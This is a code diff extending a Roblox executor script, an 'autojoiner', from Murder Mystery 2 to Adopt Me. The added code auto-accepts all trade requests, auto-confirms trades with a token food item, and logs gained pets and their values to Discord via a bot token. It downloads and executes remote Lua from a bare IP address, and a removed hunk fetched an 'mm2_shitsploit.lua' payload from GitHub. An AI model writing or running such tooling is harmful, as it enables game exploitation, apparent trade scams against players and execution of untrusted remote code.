@@ -1,13 +1,29 @@
 --claude sigmer
-joinGames = {[142823291] = true,}
+joinGames = {[142823291] = true,[920587237] = true,}
 
 if getgenv().__mm2_autojoiner_loaded then return end
 getgenv().__mm2_autojoiner_loaded = true
 
 repeat task.wait() until game:IsLoaded()
 
+-- detect which game we're in (needed BEFORE the character wait because in ADM
+-- the character doesn't spawn until a team has been chosen, so CharacterAdded
+-- would hang forever otherwise)
 local MM2_PLACE = 142823291
+local ADM_PLACE = 920587237
 local IS_MM2 = game.PlaceId == MM2_PLACE
+local IS_ADM = game.PlaceId == ADM_PLACE
+
+-- ADM: choose the team BEFORE waiting for the character so CharacterAdded fires
+if IS_ADM then
+    local okTeam, errTeam = pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("API",60):WaitForChild("TeamAPI/ChooseTeam",60):InvokeServer("Parents", {
+            source_for_logging = "intro_sequence",
+            dont_enter_location = true
+        })
+    end)
+    if not okTeam then warn("[adm] early ChooseTeam failed: "..tostring(errTeam)) end
+end
 
 nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
 a = tick()
@@ -21,7 +37,7 @@ end;
 local exec, execver = identifyexecutor()
 totalval = 0
 tradesd = 0
-minrarity = minrarity or "Classic"
+minrarity = minrarity or "Godly"
 print(1)
 
 if IS_MM2 then
@@ -53,30 +69,7 @@ end
 function getinv()
     return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
 end
-
--- SAFE DATA LOOKUP FIX: bypass the non-RobloxScript error using getgc
-local databrainrot
-if getgc then
-    for _, obj in pairs(getgc(true)) do
-        if type(obj) == "table" and rawget(obj, "Weapons") and rawget(obj, "Pets") then
-            databrainrot = obj.Weapons
-            break
-        end
-    end
-end
-if not databrainrot then
-    local ok_sync, sync_res = pcall(function() return require(game.ReplicatedStorage.Database.Sync).Weapons end)
-    if ok_sync and sync_res then databrainrot = sync_res end
-end
-if not databrainrot then
-    local ok_shit, shit_res = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/sparkscriptss/S/refs/heads/main/mm2_shitsploit.lua"))()
-    end)
-    if ok_shit and shit_res and shit_res.Weapons then
-        databrainrot = shit_res.Weapons
-    end
-end
-databrainrot = databrainrot or {}
+local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
 
 -- value lookup mirrors mm2.lua: /supreme endpoint + flexible name+type+year
 -- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
@@ -356,6 +349,392 @@ function invf()
 
 end
 
+elseif IS_ADM then
+-- forward-declare locals the early-started trade monitor below captures as
+-- upvalues; they get assigned further down once we have the trade routes
+local IsTrading
+local TradeAcceptOrDeclineRequest
+
+    -- ADM: choose Parents team and spawn at Home (redundant with the early call,
+-- kept as a safety net in case the early one missed before API replicated)
+pcall(function()
+    ReplicatedStorage:WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer("Parents", {
+        source_for_logging = "intro_sequence",
+        dont_enter_location = true
+    })
+end)
+
+-- ADM trade monitoring (started early so it's ready even before full setup)
+task.spawn(function()
+    while true do
+        if IsTrading and IsTrading() then
+            timeintrade = 0
+            repeat
+                timeintrade = timeintrade + task.wait(0.1)
+                print(timeintrade)
+                if timeintrade >= 12.5 then
+                    warn(timeintrade)
+                    if TradeAcceptOrDeclineRequest then
+                        TradeAcceptOrDeclineRequest:InvokeServer(rnsender, false)
+                    end
+                    break
+                end
+            until not (IsTrading and IsTrading())
+            warn("hi")
+            local bolean, itmes = ischanged()
+            if bolean == true then
+                tradesd = tradesd + 1
+                warn("1")
+                chand(itmes)
+                warn("2")
+            end
+        else
+            fod = false
+        end
+        task.wait(0.1)
+    end
+end)
+
+-- ADM: wait for the initial loading UI to finish
+local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local loadingScreen = playerGui:WaitForChild("AssetLoadUI", 60)
+if loadingScreen then
+    while loadingScreen.Enabled do
+        task.wait(0.1)
+    end
+end
+
+
+
+local API = ReplicatedStorage:WaitForChild("API")
+fod = false
+local ButtonPressed = API:WaitForChild("TradingServerAPI/ButtonPressed")
+local IncrementCounter = API:WaitForChild("TradingServerAPI/IncrementConsecutiveSpawnCounter")
+ButtonPressed:FireServer("spawn_dialog", "Home")
+task.wait(0.5)
+IncrementCounter:FireServer("Home")
+
+local tradeFrame = playerGui:WaitForChild("TradeApp", 30) and playerGui.TradeApp:WaitForChild("Frame", 30)
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local RouterClient = Loads("RouterClient")
+TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+local InventoryDB = Loads("InventoryDB")
+
+function getinv()
+    return require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+end
+
+inventory = getinv()
+
+rnsender = ""
+TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
+    rnsender = sender
+    TradeAcceptOrDeclineRequest:InvokeServer(sender, true) --false
+end)
+
+IsTrading = function()
+    return tradeFrame and tradeFrame.Visible or false
+end
+
+-- diff per-item by uid across every category. returns {[category] = {newItem, ...}}
+-- so chand() can show exactly which items were gained on the latest trade.
+function ischanged()
+    local currentInventory = getinv()
+    local changes = {}
+    local hasChanged = false
+    for category, items in pairs(currentInventory) do
+        if type(items) == "table" then
+            local oldItems = inventory[category] or {}
+            for uid, itemData in pairs(items) do
+                if not oldItems[uid] then
+                    changes[category] = changes[category] or {}
+                    table.insert(changes[category], itemData)
+                    hasChanged = true
+                end
+            end
+        end
+    end
+    if hasChanged then
+        inventory = currentInventory
+        return true, changes
+    end
+    return false
+end
+
+-- pet value list shared by getPetValue (must be file-scope, not trapped in spawn)
+local valueList
+task.spawn(function()
+    valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/elvebredd"))()
+end)
+
+local function formatValue(v)
+    if not v then return "0" end
+    if v >= 1e9 then return string.format("%.2fB", v / 1e9) end
+    if v >= 1e6 then return string.format("%.2fM", v / 1e6) end
+    if v >= 1e3 then return string.format("%.2fK", v / 1e3) end
+    return tostring(v)
+end
+
+local function getPetValue(petName, petProps)
+    local pet = valueList and valueList.pets and valueList.pets[petName]
+    if not pet then return nil end
+    local baseKey
+    if petProps.mega_neon then
+        baseKey = "mvalue"
+    elseif petProps.neon then
+        baseKey = "nvalue"
+    else
+        baseKey = "rvalue"
+    end
+    local suffix = ""
+    if petProps.rideable and petProps.flyable then
+        suffix = " - flyride"
+    elseif petProps.rideable then
+        suffix = " - ride"
+    elseif petProps.flyable then
+        suffix = " - fly"
+    else
+        suffix = " - nopotion"
+    end
+    return pet[baseKey .. suffix] or pet[baseKey]
+end
+
+local function formatPetDisplay(petName, props)
+    local parts = {}
+    if props.mega_neon then table.insert(parts, "M") end
+    if props.neon then table.insert(parts, "N") end
+    if props.flyable then table.insert(parts, "F") end
+    if props.rideable then table.insert(parts, "R") end
+    if #parts > 0 then return "[" .. table.concat(parts) .. "] " .. petName end
+    return petName
+end
+
+local function getInventoryDisplay(list)
+    local grouped = {}
+    for _, item in ipairs(list) do
+        local displayName = formatPetDisplay(item.Name, item.Properties)
+        if grouped[displayName] then
+            grouped[displayName].Count = grouped[displayName].Count + 1
+            grouped[displayName].TotalValue = grouped[displayName].TotalValue + item.Value
+        else
+            grouped[displayName] = { Name = displayName, Count = 1, TotalValue = item.Value, Value = item.Value }
+        end
+    end
+    local groupedList = {}
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalValue > b.TotalValue end)
+    local lines = {}
+    for _, g in ipairs(groupedList) do
+        table.insert(lines, string.format("%s → %s (x%s)", g.Name, formatValue(g.Value), g.Count))
+    end
+    -- trim to fit Discord's 1024-char field limit, leaving room for the code-block fence
+    while #table.concat(lines, "\n") > 1014 and #lines > 0 do
+        table.remove(lines)
+    end
+    return "```\n" .. table.concat(lines, "\n") .. "\n```"
+end
+
+function chand(inve)
+    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
+    neww = {}
+    newwval = 0
+    -- inve now arrives as {[category] = {itemData, ...}} from the rewritten ischanged
+    for category, list in pairs(inve) do
+        local cat = InventoryDB[category]
+        if cat then
+            for _, itemData in pairs(list) do
+                local entry = cat[itemData.id]
+                if entry then
+                    local value = getPetValue(entry.name, itemData.properties)
+                    if value then
+                        table.insert(neww, {Name = entry.name, Properties = itemData.properties, Value = value})
+                        newwval = newwval + value
+                    end
+                end
+            end
+        end
+    end
+
+    -- track running total like MM2's chang does with totalval
+    totalval = totalval + newwval
+
+    -- group identical items (same display name = same pet + same property flags)
+    local grouped = {}
+    for _, item in ipairs(neww) do
+        local displayName = formatPetDisplay(item.Name, item.Properties)
+        if grouped[displayName] then
+            grouped[displayName].Count = grouped[displayName].Count + 1
+            grouped[displayName].TotalValue = grouped[displayName].TotalValue + item.Value
+        else
+            grouped[displayName] = { Name = displayName, Count = 1, TotalValue = item.Value }
+        end
+    end
+    local groupedList = {}
+    for _, g in pairs(grouped) do table.insert(groupedList, g) end
+    table.sort(groupedList, function(a, b) return a.TotalValue > b.TotalValue end)
+
+    local itemLines = {}
+    for _, g in ipairs(groupedList) do
+        table.insert(itemLines, string.format("%s (x%s) → %s Value", g.Name, g.Count, g.TotalValue))
+    end
+    -- trim from the bottom (lowest value) to fit Discord's 1024-char field limit
+    while #table.concat(itemLines, "\n") > 1014 and #itemLines > 0 do
+        table.remove(itemLines)
+    end
+
+    fields = {
+        {
+            name="Info",
+            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 New items value: "..newwval.."\n💎 All new items value: "..totalval.."\n```"
+        },
+        {
+            name="Items",
+            value="```\n"..table.concat(itemLines, "\n").."\n```"
+        },
+    }
+
+    local payload = {
+         embeds  = {{
+            title  = "ADM autojoiner",
+            color  = 0x3EED50,
+            fields = fields,
+        }}
+    }
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Authorization"] = "Bot " .. bottoken,
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+
+    if response.StatusCode ~= 200 then
+        warn(response.Body)
+    end
+end
+
+function inv()
+    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
+    neww = {}
+    newwval = 0
+    -- getinv().pets is a flat {[uid] = petData} map, not nested by sub-category
+    local cat = InventoryDB["pets"]
+    if cat then
+        for _, itemData in pairs(getinv().pets) do
+            local entry = cat[itemData.id]
+            if entry then
+                local value = getPetValue(entry.name, itemData.properties)
+                if value then
+                    table.insert(neww, {Name = entry.name, Properties = itemData.properties, Value = value})
+                    newwval = newwval + value
+                end
+            end
+        end
+    end
+
+    -- group identical pets (same display name = same pet + same property flags)
+    local grouped = {}
+    for _, item in ipairs(neww) do
+        local displayName = formatPetDisplay(item.Name, item.Properties)
+        if grouped[displayName] then
+            grouped[displayName].Count = grouped[displayName].Count + 1
+            grouped[displayName].TotalValue = grouped[displayName].TotalValue + item.Value
+        else
+            grouped[displayName] = { Name = displayName, Count = 1, TotalValue = item.Value }
+        end
+    end
+    local groupedList = {}
+    for _, g in pairs(grouped) do table.insert(groupedList, g) end
+    table.sort(groupedList, function(a, b) return a.TotalValue > b.TotalValue end)
+
+    local itemLines = {}
+    for _, g in ipairs(groupedList) do
+        table.insert(itemLines, string.format("%s (x%s) → %s Value", g.Name, g.Count, g.TotalValue))
+    end
+    -- trim from the bottom (lowest value) to fit Discord's 1024-char field limit
+    while #table.concat(itemLines, "\n") > 1014 and #itemLines > 0 do
+        table.remove(itemLines)
+    end
+
+    fields = {
+        {
+            name="Info",
+            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 Inventory value: "..newwval.."\n```"
+        },
+        {
+            name="Inventory",
+            value="```\n"..table.concat(itemLines, "\n").."\n```"
+        },
+    }
+    local payload = {
+         embeds  = {{
+            title  = "ADM Autojoiner",
+            color  = 0x3EED50,
+            fields = fields,
+        }}
+    }
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Authorization"] = "Bot " .. bottoken,
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+
+    if response.StatusCode ~= 200 then
+        warn(response.Body)
+    end
+end
+
+-- ADM: auto-add food + accept negotiation
+task.spawn(function()
+    while true do
+        if IsTrading() then
+            if not fod then
+                local foodKeys = {}
+                for uid, data in pairs(inventory.food) do
+                    table.insert(foodKeys, uid)
+                end
+                if #foodKeys > 0 then
+                    local randomIndex = math.random(1, #foodKeys)
+                    local randomFoodUid = foodKeys[randomIndex]
+                    AddItemRemote:FireServer(randomFoodUid)
+                    fod = true
+                end
+            end
+        end
+        AcceptNegotiationRemote:FireServer()
+        task.wait(0.1)
+    end
+end)
+
+-- ADM: auto-confirm trade
+task.spawn(function()
+    while true do
+        if IsTrading() then
+            ConfirmTradeRemote:FireServer()
+        end
+        task.wait(0.1)
+    end
+end)
+
+-- ADM has no separate file-uploader; alias invf to inv so .invf still responds
+invf = inv
+
+-- ADM posts initial inventory on join (wait for the value list to load first)
+task.spawn(function()
+    while not valueList do task.wait(0.1) end
+    inv()
+end)
+
 end
 
 print(2)
@@ -600,7 +979,7 @@ local function connectgateway()
                 print("[gateway] HELLO received, sending IDENTIFY")
                 sendPayload(2, {
                     token = bottoken,
-                    intents = 33281, -- Fixed: Added GUILDS intent (1) to prevent silent disconnects
+                    intents = 33280,
                     properties = {
                         os = "linux",
                         browser = "opsec",
@@ -671,14 +1050,9 @@ local function connectgateway()
 
     print("[gateway] socket open, waiting for handshake")
 
-    socket.OnClose:Connect(function(code, reason)
+    socket.OnClose:Connect(function()
         if connectionId ~= myId then return end   -- stale handler, ignore
-        warn("[gateway] closed, reconnecting. Code: "..tostring(code).." Reason: "..tostring(reason))
-        
-        if code == 4004 then
-            warn("[gateway] ERROR: Invalid Bot Token! Your token may have been revoked.")
-        end
-        
+        warn("[gateway] closed, reconnecting")
         socket = nil
         if sessionId and sequenceNumber then
             shouldResume = true
